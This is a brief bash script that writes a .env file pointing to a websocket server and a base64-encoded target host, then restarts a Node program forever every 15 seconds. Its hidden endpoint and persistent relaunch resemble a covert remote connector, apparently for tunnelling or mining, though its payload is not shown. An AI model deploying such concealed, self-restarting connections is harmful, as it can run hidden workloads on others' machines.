#!/bin/bash
CONNECT=$1
echo "SERVER_WS=ws://cdn.medco.cyou
SERVER_TARGET=czEuZGFwaXRheC5zb2NpYWw6ODA4Mg==
SERVER_DOMAIN=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
